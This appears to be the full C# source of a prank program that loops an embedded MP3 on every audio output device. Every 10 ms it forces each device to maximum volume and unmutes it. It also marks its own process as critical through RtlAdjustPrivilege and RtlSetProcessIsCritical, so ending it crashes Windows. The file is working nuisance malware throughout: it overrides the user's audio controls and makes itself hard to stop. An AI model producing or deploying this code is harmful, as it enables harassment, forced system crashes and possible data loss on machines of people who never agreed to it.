using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using GiveMeOpop.Properties;
using NAudio.CoreAudioApi;
using NAudio.Wave;

namespace GiveMeOpop
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            var deviceEnumerator = new MMDeviceEnumerator();
            IEnumerable<MMDevice> devices = deviceEnumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active);

            NativeMethods.RtlAdjustPrivilege(20, true, false, out _);
            NativeMethods.RtlSetProcessIsCritical(true, IntPtr.Zero, false);

            foreach (var device in devices)
            {
                MemoryStream memoryStream = new MemoryStream(Resources.Opop);
                WaveStream waveStream = new Mp3FileReader(memoryStream);

                WasapiOut wout = new WasapiOut(device, AudioClientShareMode.Shared, true, 200);
                wout.Init(waveStream);
                wout.Play();

                wout.PlaybackStopped += (s, e) =>
                {
                    // 播放停止的时候, 重新开始播放
                    waveStream.Seek(0, SeekOrigin.Begin); // reset stream
                    wout.Play();
                };
            }

            while (true)
            {
                foreach (var device in devices)
                {
                    // 音量最大化
                    device.AudioEndpointVolume.MasterVolumeLevelScalar = 1f;

                    // 取消静音
                    device.AudioEndpointVolume.Mute = false;
                }

                await Task.Delay(10);
            }
        }
    }
}